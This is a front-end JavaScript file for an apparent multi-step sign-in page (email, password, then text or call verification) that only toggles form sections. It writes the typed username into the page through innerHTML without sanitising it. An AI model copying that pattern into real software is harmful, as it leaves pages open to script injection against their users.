
var nextBtn = document.querySelector(".sign-in-next-btn-submit");
var signInBtn = document.querySelector(".sign-in-btn-submit");

var verifyDiv = document.querySelector(".verification-form");

var textVerifyDiv = document.querySelector(".text-verify");
var callVerifyDiv = document.querySelector(".call-verify");

var passwordDiv = document.querySelector(".password-sign-in-form");
var emailDiv = document.querySelector(".email-sign-in-form");
var loadingDiv = document.querySelector(".loading-screen-div");
var cancelBtn = document.querySelector(".btn-cancel")

nextBtn.addEventListener("click", function(event) {
  event.preventDefault(); 
  loadingDiv.style.display = "block";
  emailDiv.style.display = "none";
  removeLoadingDiv();
});

signInBtn.addEventListener("click", function(event) {
  event.preventDefault(); 
  verifyDiv.style.display = "block";
  passwordDiv.style.display = "none";
});

cancelBtn.addEventListener("click", function(event) {
  event.preventDefault(); 
  emailDiv.style.display = "block";
  verifyDiv.style.display = "none";
});

let usernameValue = localStorage.getItem("username") || "";

function returnUsername() {
  usernameValue = document.getElementById("username").value;
  localStorage.setItem("username", usernameValue);
  document.getElementById("display-name").innerHTML = usernameValue;
  return usernameValue;
}

document.getElementById("username").addEventListener("keyup", returnUsername);


function removeLoadingDiv() {
  const loadingDiv = document.querySelector(".loading-screen-div");
  const loadingSlide = document.querySelector(".loading-body");
  if (loadingDiv) {
    setTimeout(() => {
      loadingSlide.classList.add("slide-out")
      loadingDiv.style.display = "none";
      passwordDiv.style.display ="block"
    }, 1000);
  }
}

var textBtn = document.getElementById('verifyTextBtn');

textBtn.addEventListener('click', function() {
  verifyDiv.style.display = "none";
  textVerifyDiv.style.display = "block";

});

var callBtn = document.getElementById('verifyCallBtn');

callBtn.addEventListener('click', function() {
  verifyDiv.style.display = "none";
  callVerifyDiv.style.display = "block";

});






